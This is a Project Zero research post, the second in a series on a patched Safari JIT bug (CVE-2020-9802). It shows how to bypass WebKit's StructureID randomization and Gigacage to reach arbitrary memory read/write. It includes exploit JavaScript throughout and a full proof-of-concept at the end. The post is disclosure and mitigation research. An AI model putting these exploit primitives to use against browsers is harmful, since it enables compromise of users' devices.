---
source: p0
source_url: https://projectzero.google/2020/09/jitsploitation-two.html
title: "JITSploitation II: Getting Read/Write - Project Zero"
description: "Posted by Samuel Groß, Project ZeroThis three-part series highlights the technical challenges inv..."
---

Posted by Samuel Groß, Project Zero

This three-part series highlights the technical challenges involved in finding and exploiting JavaScript engine vulnerabilities in modern web browsers and evaluates current exploit mitigation technologies. The exploited vulnerability, CVE-2020-9802, was fixed in iOS 13.5, while two of the mitigation bypasses, CVE-2020-9870 and CVE-2020-9910, were fixed in iOS 13.6.

# ==========

This is the second part in a series about a Safari renderer exploit from a JIT bug. In [Part 1](https://projectzero.google/2020/09/jitsploitation-one.html), a vulnerability in the DFG JIT’s implementation of Common-Subexpression Elimination was discussed. The second part starts from the well-known addrof and fakeobj primitives and shows how stable, arbitrary memory read/write can be constructed from it. For that, the StructureID randomization mitigation and the Gigacage will be discussed and bypassed.

## Overview

[Back in 2016](http://www.phrack.org/papers/attacking_javascript_engines.html), an attacker would use the addrof and fakeobj primitives to fake an [ArrayBuffer](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer), thus immediately gaining a reliable arbitrary memory read/write primitive. But in mid 2018, WebKit introduced the “ [Gigacage](https://phakeobj.netlify.app/posts/gigacage/)”, which attempts to stop abuse of ArrayBuffers in that way. The Gigacage works by moving ArrayBuffer backing stores into a 4GB heap region and using 32bit relative offsets instead of absolute pointers to refer to them, thus making it (more or less) impossible to use ArrayBuffers to access data outside of the cage.

However, while ArrayBuffer storages are caged, JSArray [Butterflies](https://liveoverflow.com/the-butterfly-of-jsobject-browser-0x02/), which contain the array’s elements, are not. As they [can store raw floating point values](https://github.com/WebKit/webkit/blob/dbdff0ccefd4e4f68440c37ec19bd56e2f103649/Source/JavaScriptCore/runtime/Butterfly.h#L128), an attacker immediately gains a fairly powerful arbitrary read/write by faking such an “unboxed double” JSArray. This is how various [public exploits have worked around the Gigacage in the past](https://iokit.racing/jsctales.pdf). (Un)fortunately, WebKit has introduced a mitigation aimed to stop an attacker from faking JavaScript objects entirely: StructureID randomization. This mitigation will thus have to be bypassed first.

As such, this post will

- Explain the in-memory layout of JSObjects


- Bypass the StructureID randomization to fake a JSArray object

- Use the faked JSArray object to set up a (limited) memory read/write primitive

- Break out of the Gigacage to get a fast, reliable, and truly arbitrary read/write primitive


Let’s go.

## Faking Objects

In order to fake objects, one has to know their in-memory layout. A plain [JSObject](https://github.com/WebKit/webkit/blob/dbdff0ccefd4e4f68440c37ec19bd56e2f103649/Source/JavaScriptCore/runtime/JSObject.h#L94) in JSC consists of a [JSCell header](https://github.com/WebKit/webkit/blob/dbdff0ccefd4e4f68440c37ec19bd56e2f103649/Source/JavaScriptCore/runtime/JSCell.h#L272) followed by the “ [Butterfly](https://github.com/WebKit/webkit/blob/dbdff0ccefd4e4f68440c37ec19bd56e2f103649/Source/JavaScriptCore/runtime/Butterfly.h#L133)” and possibly inline properties. The Butterfly is a storage buffer containing the object’s properties and elements as well as the number of elements (the length):

[![Image: Layout of a JSC Butterfly in memory](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiehNa_s1200_image2%289%29.png)](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiehNa_s1442_image2%289%29.png)

Objects such as [JSArrayBuffers](https://github.com/WebKit/webkit/blob/dbdff0ccefd4e4f68440c37ec19bd56e2f103649/Source/JavaScriptCore/runtime/JSArrayBuffer.h#L65) add further members to the JSObject layout.

Each JSCell header references a [Structure](https://github.com/WebKit/webkit/blob/dbdff0ccefd4e4f68440c37ec19bd56e2f103649/Source/JavaScriptCore/runtime/Structure.h#L126) through the StructureID field in the JSCell header which is an index into the Runtime’s [StructureIDTable](https://github.com/WebKit/webkit/blob/dbdff0ccefd4e4f68440c37ec19bd56e2f103649/Source/JavaScriptCore/runtime/StructureIDTable.h#L88). A Structure is basically a blob of type information containing information such as:

- The base type of the object, such as JSObject, JSArray, JSString, JSUint8Array, …

- The properties of the object and where they are stored relative to the object

- The size of the object in bytes


- The [indexing type](https://github.com/WebKit/webkit/blob/dbdff0ccefd4e4f68440c37ec19bd56e2f103649/Source/JavaScriptCore/runtime/IndexingType.h#L60), which indicates the type of array elements stored in the butterfly, such as JSValue, Int32, or unboxed double, and whether they are stored as one contiguous array or in some other way, [for example in a map](https://github.com/WebKit/webkit/blob/4ceb36e525b55b9d49aed0b400507d522953e025/Source/JavaScriptCore/runtime/SparseArrayValueMap.h#L80).

- Etc.


Finally, [the remaining JSCell header bits](https://github.com/WebKit/webkit/blob/dbdff0ccefd4e4f68440c37ec19bd56e2f103649/Source/JavaScriptCore/runtime/JSCell.h#L273) contain things like the GC marking state and “cache” some of the frequently used bits of type information, such as the indexing type. The image below summarizes the in-memory layout of a plain JSObject on a 64bit architecture.

![Image: Layout of a JSC JSObject in memory](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj4g2i_s562_image3%287%29.png)

Most operations performed on an object will have to look at the object’s Structure to determine what to do with the object. As such, when creating fake JSObjects, it is necessary to know the StructureID of the type of object that is to be faked. Previously, it was possible to use StructureID Spraying to predict StructureIDs. This worked by simply allocating many objects of the desired type (for example, Uint8Array) and adding a different property to each of them, causing a unique Structure and thus StructureID to be allocated for that object. Doing this maybe a thousand times would virtually guarantee that 1000 was a valid StructureID for a Uint8Array object. This is where StructureID randomization, a new exploit mitigation from [early 2019](https://github.com/WebKit/webkit/commit/f19aec9c6319a216f336aacd1f5cc75abba49cdf), now comes into play.

## StructureID Randomization

The idea behind this exploit mitigation is straight forward: as an attacker (supposedly) needs to know a valid StructureID to fake objects, randomizing the IDs will hamper that. The exact randomization scheme is [well documented in the source code](https://github.com/WebKit/webkit/blob/dbdff0ccefd4e4f68440c37ec19bd56e2f103649/Source/JavaScriptCore/runtime/StructureIDTable.h#L136). With that, it is now no longer possible to predict a StructureID.

There are different approaches to bypass StructureID randomization, including:

1. Leaking a valid StructureID, e.g. [through an OOB read](https://iokit.racing/jsctales.pdf)

2. Abusing code that does not check the StructureID, [as has already been demonstrated](https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf)

3. Constructing a "StructureID oracle" to brute force a valid StructureID


A possible idea for the "StructureID oracle" is to abuse the JIT again. One very common code pattern emitted by the compiler are StructureChecks to guard type speculations. In pseudo-C they look roughly like this:

int structID = LoadStructureId(obj)

if (structID != EXPECTED\_STRUCT\_ID) {

    bailout();

}

This could allow the construction of a “StructureID oracle”: if a JIT compiled function can be constructed that checks, but then doesn’t use a structure ID, then an attacker should be able to determine whether a StructureID is valid by observing whether a bailout had occurred. This in turn should be possible either through timing, or by “exploiting” [a correctness issue in the JIT](https://bugs.webkit.org/show_bug.cgi?id=211900) that causes the same code to produce different results when run in the JIT vs in the interpreter (where execution would continue after a bailout). An oracle like this would then allow an attacker to brute force a valid structure ID by predicting the incrementing index bits and brute forcing the [7 entropy bits](https://github.com/WebKit/webkit/blob/dbdff0ccefd4e4f68440c37ec19bd56e2f103649/Source/JavaScriptCore/runtime/StructureIDTable.h#L136).

However, leaking a valid structureID and abusing code that doesn't check the structureID seem like the easier options. In particular, there is a [code path in the interpreter when loading elements of a JSArray](https://github.com/WebKit/webkit/blob/4ceb36e525b55b9d49aed0b400507d522953e025/Source/JavaScriptCore/llint/LLIntSlowPaths.cpp#L1029) that never accesses the StructureID:

static ALWAYS\_INLINE JSValue getByVal(VM& vm, JSValue baseValue, JSValue subscript)

{

    ...;

    if (subscript.isUInt32()) {

        uint32\_t i = subscript.asUInt32();

        if (baseValue.isObject()) {

            JSObject\* object = asObject(baseValue);

            if (object->canGetIndexQuickly(i))

                return object->getIndexQuickly(i);

Here, getIndexQuickly directly loads the element from the butterfly, and canGetIndexQuickly only looks at the indexing type in the JSCell header (for which the values are known constants) and the length in the butterfly:

bool canGetIndexQuickly(unsigned i) const {

    const Butterfly\* butterfly = this->butterfly();

    switch (indexingType()) {

    ...;

    case ALL\_CONTIGUOUS\_INDEXING\_TYPES:

        return i < butterfly->vectorLength() && butterfly->contiguous().at(this, i);

}

This now allows faking something that looks a bit like a JSArray, pointing its backing storage pointer onto another, valid JSArray, then reading that JSArray’s JSCell header which includes a valid StructureID:

[![Image: Technique to achieve memory read/write through a corrupted JSArray](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjv_Ie_s1200_image1%2813%29.png)](https://projectzero.google/images/oldblog/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjv_Ie_s1833_image1%2813%29.png)

At that point, the StructureID randomization is fully bypassed.

The following JavaScript code implements this, faking the object as usual by (ab)using inline properties of a “container” object:

let container = {

    jscell\_header: jscell\_header,

    butterfly: legit\_float\_arr,

};

let container\_addr = addrof(container);

// add offset from container object to its inline properties

let fake\_array\_addr = Add(container\_addr, 16);

let fake\_arr = fakeobj(fake\_array\_addr);

// Can now simply read a legitimate JSCell header and use it.

jscell\_header = fake\_arr\[0\];

container.jscell\_header = jscell\_header;

// Can read/write to memory now by corrupting the butterfly

// pointer of the float array.

fake\_arr\[1\] = 3.54484805889626e-310;    // 0x414141414141 in hex

float\_arr\[0\] = 1337;

This code will crash while accessing memory around 0x414141414141. As such, the attacker has now gained an arbitrary memory read/write primitive, albeit a slightly limited one:

- Only valid double values can be read and written

- As the Butterfly also stores its own length, it is necessary to position the butterfly pointer such that its length appears large enough to access the desired data


## A Note on Exploit Stability

Running the current exploit would yield memory read/write, but would likely crash soon after when the garbage collector runs the next time and scans all reachable heap objects.

The general approach to achieve exploit stability is to keep all heap objects in a functioning state (one that will not cause the GC to crash when it scans the object and visits all outgoing pointers), or, if that is not possible, to repair them as soon as possible after corruption. In the case of this exploit, the fake\_arr is initially “GC unsafe” as it contains an invalid StructureID. When its JSCell is later replaced with a valid one (container.jscell\_header = jscell\_header;) the faked object becomes “GC safe” as it appears like a valid JSArray to the GC.

However, there are some edge cases that can lead to corrupted data being stored in other places of the engine as well. For example, the array load in the previous JavaScript snippet (jscell\_header = fake\_arr\[0\];) will be performed by a get\_by\_val bytecode operation. This operation also [keeps a cache of the last seen structure ID](https://github.com/WebKit/webkit/blob/b4adcb485cc8812a374bc1d57c66692d2a67399b/Source/JavaScriptCore/llint/LowLevelInterpreter.asm#L1156), which is used to build the value profiles relied on by the JIT compiler. This is problematic, as the structure ID of the faked JSArray is invalid and will thus lead to crashes, for example when the GC scans the bytecode caches. However, the fix is fortunately fairly easy: execute the same get\_by\_val op twice, the second time with a valid JSArray, whose StructureID will then be cached instead:

...

let fake\_arr = fakeobj(fake\_array\_addr);

let legit\_arr = float\_arr;

let results = \[\];

for (let i = 0; i < 2; i++) {

    let a = i == 0 ? fake\_arr : legit\_arr;

    results.push(a\[0\]);

}

jscell\_header = results\[0\];

...

Doing this makes the current exploit stable across GC executions.

## Breaking out of the (Giga-)Cage

Note: this part is mostly a fun exercise in JIT exploitation and not strictly required for the exploit as it has already constructed a strong enough read/write primitive. However, it makes the exploit faster as the read/write gained from this is more performant and also truly arbitrary.

Somewhat contrary to the description at the beginning of this post, ArrayBuffers in JSC are actually protected by two separate mechanisms:

The [Gigacage](https://github.com/WebKit/webkit/commit/d2bbe276796add2f96b13717d703f86a588409c5): a multi-GB virtual memory region in which the backing storage buffers of TypedArrays (and some other objects) are allocated. Instead of a 64bit pointer, the backing storage pointer is now basically a 32bit offset from the base of the cage, preventing access outside of it.

The [PACCage](https://github.com/WebKit/webkit/commit/9c4ecbe9414676e1a4548db96021fbeeaa240df7): In addition to the Gigacage, TypedArray [backing store pointers](https://github.com/WebKit/webkit/blob/b4adcb485cc8812a374bc1d57c66692d2a67399b/Source/JavaScriptCore/runtime/JSArrayBufferView.h#L107) are now also protected through pointer authentication code ( [PAC](https://support.apple.com/guide/security/pointer-authentication-codes-seca5759bf02/web)) where available, preventing tampering with them on the heap as an attacker will generally be unable to forge a valid PAC signature.

The exact scheme used to combine the Gigacage and the PACCage is documented for example in commit [205711404e](https://github.com/WebKit/webkit/commit/205711404e0cc1fe8a9566ca2970603ec37c8f0f). With that, TypedArrays are essentially doubly-protected and so evaluating whether they can still be abused for read/write seemed like a worthwhile endeavour. One place to look for potential issues is again in the JIT as it has special handling for TypedArrays to boost performance.

### TypedArrays in DFG

Consider the following JavaScript code.

function opt(a) {

    return a\[0\];

}

let a = new Uint8Array(1024);

for (let i = 0; i < 100000; i++) opt(a);

When optimizing in DFG, the opt function would be translated to roughly the following DFG IR (with many details omitted):

CheckInBounds a, 0

v0 = GetIndexedPropertyStorage

v1 = GetByVal v0, 0

Return v1

What is interesting about this is the fact that the access to the TypedArray has been split into three different operations: a bounds check on the index, a GetIndexedPropertyStorage operation, responsible for [fetching and uncaging the backing storage pointer](https://github.com/WebKit/webkit/blob/909d1c0d841c7810ca7dd108e5b3e01ed71dcb85/Source/JavaScriptCore/dfg/DFGSpeculativeJIT.cpp#L7293), and a GetByVal operation which will essentially translate to a single memory load instruction. The above IR would then result in machine code looking roughly as follows, assuming that r0 held the pointer to the TypedArray a:

; bounds check omitted

Lda r2, \[r0 + 24\];

; Uncage and unPAC r2 here

Lda r0, \[r2\]

B lr

However, what would happen if no general purpose register was available for GetIndexedPropertyStorage to store the raw pointer into? In that case, the pointer would have to be spilled to the stack. This could then allow an attacker with the ability to corrupt stack memory to break out of both cages by modifying the spilled pointer on the stack before it is used to access memory by a GetByVal or SetByVal operation.

The rest of this blog post will describe how such an attack can be implemented in practice. For that, three main challenges have to be solved:

1. Leaking a stack pointer in order to then find and corrupt spilled values on the stack

2. Separating the GetIndexedPropertyStorage from the GetByVal operation so that code that modifies the spilled pointer can execute in between

3. Forcing the uncaged storage pointer to be spilled to the stack


### Finding the Stack

As it turns out, finding a pointer to the stack in JSC given an arbitrary heap read/write is fairly easy: The [topCallFrame](https://github.com/WebKit/webkit/blob/b4adcb485cc8812a374bc1d57c66692d2a67399b/Source/JavaScriptCore/runtime/VM.h#L656) member of the VM object is actually a pointer into the stack, as the JSC interpreter makes use of the native stack, and so the top JS call frame is also basically the top of the main thread’s stack. As such, finding the stack becomes as easy as following a pointer chain from the global object to the VM instance:

let global = Function('return this')();

let js\_glob\_obj\_addr = addrof(global);

let glob\_obj\_addr = read64(Add(js\_glob\_obj\_addr,

    offsets.JS\_GLOBAL\_OBJ\_TO\_GLOBAL\_OBJ));

let vm\_addr = read64(Add(glob\_obj\_addr, offsets.GLOBAL\_OBJ\_TO\_VM));

let vm\_top\_call\_frame\_addr = Add(vm\_addr,

    offsets.VM\_TO\_TOP\_CALL\_FRAME);

let vm\_top\_call\_frame\_addr\_dbl = vm\_top\_call\_frame\_addr.asDouble();

let stack\_ptr = read64(vm\_top\_call\_frame\_addr);

log(\`\[\*\] Top CallFrame (stack) @ ${stack\_ptr}\`);

### Separating TypedArray Access Operations

With the opt function above that simply accesses a typed array at an index once (i.e. a\[0\]), the GetIndexedPropertyStorage operation will be directly followed by the GetByVal operation, thus making it impossible to corrupt the uncaged pointer even if it was spilled onto the stack. However, the following code already manages to separate the two operations:

function opt(a) {

    a\[0\];

    // Spill code here

    a\[1\];

}

This code will initially generate the following DFG IR:

v0 = GetIndexedPropertyStorage a

GetByVal v0, 0

// Spill code here

v1 = GetIndexedPropertyStorage a

GetByVal v1, 1

Then, a bit later in the optimization pipeline, the two GetIndexedPropertyStorage operations will be [CSE’d](https://en.wikipedia.org/wiki/Common_subexpression_elimination) into a single one, thus separating the 2nd GetByVal from the GetIndexedPropertyStorage operation:

v0 = GetIndexedPropertyStorage a

GetByVal v0, 0

// Spill code here

// Then walk over stack here and replace backing storage pointer

GetByVal v0, 1

However, this will only happen if [the spilling code doesn’t modify global state](https://github.com/WebKit/webkit/blob/b4adcb485cc8812a374bc1d57c66692d2a67399b/Source/JavaScriptCore/dfg/DFGClobberize.h#L1254), because that could potentially [detach](https://tc39.es/ecma262/#sec-detacharraybuffer) the TypedArray’s buffer, thus invalidating its backing storage pointer. In that case, the compiler would be forced to reload the backing storage pointer for the 2nd GetByVal. As such, it’s not possible to run completely arbitrary code to force spilling, but that is not a problem as is shown next. It is also worth noting that two different indices must be used here since otherwise the GetByVals could be CSE’d as well.

### Spilling Registers

With the previous two steps done, the remaining question is how to force spilling of the uncaged pointer produced by GetIndexedPropertyStorage. One way to force spilling while still allowing the CSE to happen is by performing some simple mathematical computations that require a lot of temporary values to be kept alive. The following code accomplishes this in a stylish way:

let p = 0; // Placeholder, needed for the ascii art =)

let r0=i,r1=r0,r2=r1+r0,r3=r2+r1,r4=r3+r0,r5=r4+r3,r6=r5+r2,r7=r6+r1,r8=r7+r0;

let r9=            r8+   r7,r10=r9+r6,r11=r10+r5,   r12   =r11+p      +r4+p+p;

let r13   =r12+p   +r3,   r14=r13+r2,r15=r14+r1,   r16=   r15+p   +   r0+p+p+p;

let r17   =r16+p   +r15,   r18=r17+r15,r19=r18+   r14+p   ,r20   =p   +r19+r13;

let r21   =r19+p   +r12 ,   r22=p+      r21+p+   r11+p,   r23   =p+   r22+r10;

let r24            =r23+r9   ,r25   =p   +r24   +r8+p+p   +p   ,r26   =r25+r7;

let r27   =r26+r6,r28=r27+p   +p   +r5+   p,   r29=r28+   p    +r4+   p+p+p+p;

let r30   =r29+r3,r31=r30+r2      ,r32=p      +r31+r1+p      ,r33=p   +r32+r0;

let r34=r33+r32,r35=r34+r31,r36=r25+r30,r37=r36+r29,r38=r37+r28,r39=r38+r27+p;

let r = r39; // Keep the entire computation alive, or nothing will be spilled.

The computed series is somewhat similar to the fibonacci series, but requires that intermediate results are kept alive as they are needed again later on in the series. Unfortunately, this approach is somewhat fragile as unrelated changes to various parts of the engine, in particular the register allocator, will easily break the stack spilling.

There is another, simpler way (although probably slightly less performant and certainly less visually appealing) that virtually guarantees that a raw storage pointer will be spilled to the stack: simply access as many TypedArrays as there are general purpose registers instead of just one. In that case, as there are not enough registers to hold all the raw backing storage pointers, some of them will have to be spilled to the stack where they can then be found and replaced. A naive version of this would look as follows:

typed\_array1\[0\];

typed\_array2\[0\];

...;

typed\_arrayN\[0\];

// Walk over stack, find and replace spilled backing storage pointer

let stack = ...;   // JSArray pointing into stack

for (let i = 0; i < 512; i++) {

    if (stack\[i\] == old\_ptr) {

        stack\[i\] = new\_ptr;

        break;

    }

}

typed\_array1\[0\] = val\_to\_write;

typed\_array2\[0\] = val\_to\_write;

...;

typed\_arrayN\[0\] = val\_to\_write;

With the main challenges overcome, the attack can now be implemented and a proof-of-concept is attached at the end of this blog post for the interested reader. All in all the technique is quite fiddly to implement initially, with a few more gotchas that have to be taken care of - see the PoC for details. However, once implemented, the resulting code is highly reliable and very fast, almost instantly achieving a truly arbitrary memory read/write primitive on both macOS and iOS and across different WebKit builds without additional changes.

## Conclusion

This post showed how an attacker can (still) exploit the well-known addrof and fakeobj primitives to gain arbitrary memory read/write in WebKit. For that the StructureID mitigation had to be bypassed, while bypassing the Gigacage was mostly optional (but fun). I would personally draw the following conclusions from writing the exploit up to this point:

1. StructureID randomization seems very weak at this point. As a fair amount of type information is stored in the JSCell bits and thus predictable by the attacker, it seems likely that many other operations can be found and abused that don’t require a valid StructureID. Furthermore, bugs that can be turned into heap out-of-bounds reads can likely be used to leak a valid StructureID.

2. In its current state, the purpose of the Gigacage as a security mitigation is not entirely clear to me, as an (almost) arbitrary read/write primitive can be constructed from plain JSArrays which are not subject to the Gigacage. At that point, as demonstrated here, the Gigacage can also be fully bypassed, even though that is likely not necessary in practice.

3. I think it would be worth investigating the impact (both on security and performance) of removing unboxed double JSArrays and properly caging the remaining JSArray types (which all store “boxed” JSValues). This could potentially make both the StructureID randomization and the Gigacage much stronger. In the case of this exploit, this would have prevented the construction of the addrof and fakeobj primitives in the first place (because the double <-> JSValue type confusion could no longer be constructed) as well as the limited read/write through JSArrays and would also prevent leaking a valid StructureID via an OOB access into a JSArray (arguably the most common scenario for OOB accesses).


[The final part](https://projectzero.google/2020/09/jitsploitation-three.html) of this series will show how PC control can be gained from the read/write despite more mitigations such as PAC and APRR.

## Proof-of-Concept GigaUnCager

## |     | | --- | | // This function achieves arbitrary memory read/write by abusing TypedArrays.<br>//<br>// In JSC, the typed array backing storage pointers are caged as well as PAC<br>// signed. As such, modifying them in memory will either just lead to a crash<br>// or only yield access to the primitive Gigacage region which isn't very useful.<br>//<br>// This function bypasses that when one already has a limited read/write primitive:<br>// 1\. Leak a stack pointer<br>// 2\. Access NUM\_REGS+1 typed array so that their uncaged and PAC authenticated backing<br>//    storage pointer are loaded into registers via GetIndexedPropertyStorage.<br>//    As there are more of these pointers than registers, some of the raw pointers<br>//    will be spilled to the stack.<br>// 3\. Find and modify one of the spilled pointers on the stack<br>// 4\. Perform a second access to every typed array which will now load and<br>//    use the previously spilled (and now corrupted) pointers.<br>//<br>// It is also possible to implement this using a single typed array and separate<br>// code to force spilling of the backing storage pointer to the stack. However,<br>// this way it is guaranteed that at least one pointer will be spilled to the<br>// stack regardless of how the register allocator works as long as there are<br>// more typed arrays than registers.<br>//<br>// NOTE: This function is only a template, in the final function, every<br>// line containing an "$r" will be duplicated NUM\_REGS times, with $r<br>// replaced with an incrementing number starting from zero.<br>//<br>const READ =0, WRITE =1;<br>let memhax\_template =function memhax(memviews, operation, address, buffer, length, stack, needle){<br>// See below for the source of these preconditions.<br>if(length > memviews\[0\].length){<br>throw"Memory access too large";<br>}elseif(memviews.length %2!==1){<br>throw"Need an odd number of TypedArrays";<br>}<br>// Save old backing storage pointer to restore it afterwards.<br>// Otherwise, GC might end up treating the stack as a MarkedBlock.<br>    let savedPtr = controller\[1\];<br>// Function to get a pointer into the stack, below the current frame.<br>// This works by creating a new CallFrame (through a native funcion), which<br>// will be just below the CallFrame for the caller function in the stack,<br>// then reading VM.topCallFrame which will be a pointer to that CallFrame:<br>// https://github.com/WebKit/webkit/blob/e86028b7dfe764ab22b460d150720b00207f9714/<br>// Source/JavaScriptCore/runtime/VM.h\#L652)<br>function getsp(){<br>function helper(){<br>// This code currently assumes that whatever precedes topCallFrame in<br>// memory is non-zero. This seems to be true on all tested platforms.<br>            controller\[1\]= vm\_top\_call\_frame\_addr\_dbl;<br>return memarr\[0\];<br>}<br>// DFGByteCodeParser won't inline Math.max with more than 3 arguments<br>// https://github.com/WebKit/webkit/blob/e86028b7dfe764ab22b460d150720b00207f9714/<br>// Source/JavaScriptCore/dfg/DFGByteCodeParser.cpp\#L2244<br>// As such, this will force a new CallFrame to be created.<br>        let sp =Math.max({valueOf: helper},-1,-2,-3);<br>returnInt64.fromDouble(sp);<br>}<br>    let sp = getsp();<br>// Set the butterfly of the \|stack\| array to point to the bottom of the current<br>// CallFrame, thus allowing us to read/write stack data through it. Our current<br>// read/write only works if the value before what butterfly points to is nonzero.<br>// As such, we might have to try multiple stack values until we find one that works.<br>    let tries =0;<br>    let stackbase =newInt64(sp);<br>    let diff =newInt64(8);<br>do{<br>        stackbase.assignAdd(stackbase, diff);<br>        tries++;<br>        controller\[1\]= stackbase.asDouble();<br>}while(stack.length <512&& tries <64);<br>// Load numregs+1 typed arrays into local variables.<br>    let m$r = memviews\[$r\];<br>// Load, uncage, and untag all array storage pointers.<br>// Since we have more than numreg typed arrays, at least one of the<br>// raw storage pointers will be spilled to the stack where we'll then<br>// corrupt it afterwards.<br>    m$r\[0\]=0;<br>// After this point and before the next access to memview we must not<br>// have any DFG operations that write Misc (and as such World), i.e could<br>// cause a typed array to be detached. Otherwise, the 2nd memview access<br>// will reload the backing storage pointer from the typed array.<br>// Search for correct offset.<br>// One (unlikely) way this function could fail is if the compiler decides<br>// to relocate this loop above or below the first/last typed array access.<br>// This could easily be prevented by creating artificial data dependencies<br>// between the typed array accesses and the loop.<br>//<br>// If we wanted, we could also cache the offset after we found it once.<br>    let success =false;<br>// stack.length can be a negative number here so fix that with a bitwise and.<br>for(let i =0; i <Math.min(stack.length &0x7fffffff,512); i++){<br>// The multiplication below serves two purposes:<br>//<br>// 1\. The GetByVal must have mode "SaneChain" so that it doesn't bail<br>//    out when encountering a hole (spilled JSValues on the stack often<br>//    look like NaNs): https://github.com/WebKit/webkit/blob/<br>//    e86028b7dfe764ab22b460d150720b00207f9714/Source/JavaScriptCore/<br>//    dfg/DFGFixupPhase.cpp\#L949<br>//    Doing a multiplication achieves that: https://github.com/WebKit/<br>//    webkit/blob/e86028b7dfe764ab22b460d150720b00207f9714/Source/<br>//    JavaScriptCore/dfg/DFGBackwardsPropagationPhase.cpp\#L368<br>//<br>// 2\. We don't want \|needle\| to be the exact memory value. Otherwise,<br>//    the JIT code might spill the needle value to the stack as well,<br>//    potentially causing this code to find and replace the spilled needle<br>//    value instead of the actual buffer address.<br>//<br>if(stack\[i\]\*2=== needle){<br>            stack\[i\]= address;<br>            success = i;<br>break;<br>}<br>}<br>// Finally, arbitrary read/write here :)<br>if(operation === READ){<br>for(let i =0; i < length; i++){<br>            buffer\[i\]=0;<br>// We assume an odd number of typed arrays total, so we'll do one<br>// read from the corrupted address and an even number of reads<br>// from the inout buffer. Thus, XOR gives us the right value.<br>// We could also zero out the inout buffer before instead, but<br>// this seems nicer :)<br>            buffer\[i\]^= m$r\[i\];<br>}<br>}elseif(operation === WRITE){<br>for(let i =0; i < length; i++){<br>            m$r\[i\]= buffer\[i\];<br>}<br>}<br>// For debugging: can fetch SP here again to verify we didn't bail out in between.<br>//let end\_sp = getsp();<br>    controller\[1\]= savedPtr;<br>return{success, sp, stackbase};<br>}<br>// Add one to the number of registers so that:<br>// \- it's guaranteed that there are more values than registers (note this is<br>//   overly conservative, we'd surely get away with less)<br>// \- we have an odd number so the XORing logic for READ works correctly<br>let nregs = NUM\_REGS +1;<br>// Build the real function from the template :><br>// This simply duplicates every line containing the marker nregs times.<br>let source =\[\];<br>let template= memhax\_template.toString();<br>for(let line of template.split('\\n')){<br>if(line.includes('$r')){<br>for(let reg =0; reg < nregs; reg++){<br>            source.push(line.replace(/\\$r/g, reg.toString()));<br>}<br>}else{<br>        source.push(line);<br>}<br>}<br>source = source.join('\\n');<br>let memhax =eval((${source}));<br>//log(memhax);<br>// On PAC-capable devices, the backing storage pointer will have a PAC in the<br>// top bits which will be removed by GetIndexedPropertyStorage. As such, we are<br>// looking for the non-PAC'd address, thus the bitwise AND.<br>if(IS\_IOS){<br>    buf\_addr.assignAnd(buf\_addr,newInt64('0x0000007fffffffff'));<br>}<br>// Also, we don't search for the address itself but instead transform it slightly.<br>// Otherwise, it could happen that the needle value is spilled onto the stack<br>// as well, thus causing the function to corrupt the needle value.<br>let needle = buf\_addr.asDouble()\*2;<br>log(\`\[\*\]Constructing arbitrary read/write by abusing TypedArray@ ${buf\_addr}\`);<br>// Buffer to hold input/output data for memhax.<br>let inout =newInt32Array(0x1000);<br>// This will be the memarr after training.<br>let dummy\_stack =\[1.1, buf\_addr.asDouble(),2.2\];<br>let views =newArray(nregs).fill(view);<br>let lastSp =0;<br>let spChanges =0;<br>for(let i =0; i < ITERATIONS; i++){<br>    let out= memhax(views, READ,13.37, inout,4, dummy\_stack, needle);<br>out= memhax(views, WRITE,13.37, inout,4, dummy\_stack, needle);<br>if(out.sp.asDouble()!= lastSp){<br>        lastSp =out.sp.asDouble();<br>        spChanges +=1;<br>// It seems we'll see 5 different SP values until the function is FTL compiled<br>if(spChanges ==5){<br>break;<br>}<br>}<br>}<br>// Now use the real memarr to access stack memory.<br>let stack = memarr;<br>// An address that's safe to clobber<br>let scratch\_addr =Add(buf\_addr,42\*4);<br>// Value to write<br>inout\[0\]=0x1337;<br>for(let i =0; i <10; i++){<br>    view\[42\]=0;<br>    let out= memhax(views, WRITE, scratch\_addr.asDouble(), inout,1, stack, needle);<br>if(view\[42\]!=0x1337){<br>throw"failed to obtain reliable read/write primitive";<br>}<br>}<br>log(\[+\]Got stable arbitrary memory read/write!);<br>if(DEBUG){<br>    log("\[\*\] Verifying exploit stability...");<br>    gc();<br>    log("\[\*\] All stable!");<br>} |